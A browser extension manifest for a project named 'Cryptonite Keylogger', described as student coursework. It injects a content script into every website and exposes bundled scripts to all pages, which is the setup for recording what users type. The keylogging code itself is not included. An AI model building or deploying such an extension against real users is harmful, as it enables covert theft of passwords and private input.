{
    "manifest_version": 3,
    "name": "Cryptonite Keylogger",
    "version": "1.0.0",
    "description": "Keylogger developed for 6th sem project work",
    "externally_connectable": {
        "ids": ["cfmemdbkkoijppljnfpfhbkkfmcmbnik"],
        "matches": ["*://localhost/*"]
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["./scripts/content.js"],
            "css": ["./public/test.css"]
            
        }
    ],
    "web_accessible_resources": [{
        "matches": ["<all_urls>"],
        "resources": ["scripts/brython.js", "scripts/brython_stdlib.js","scripts/test.js","public/test.html", "public/item.html"]
    }],
    "action": {
        "default_title": "Cryptonite Keylogger",
        "default_popup": "./popup.html"
    },
    "permissions": ["storage"]
}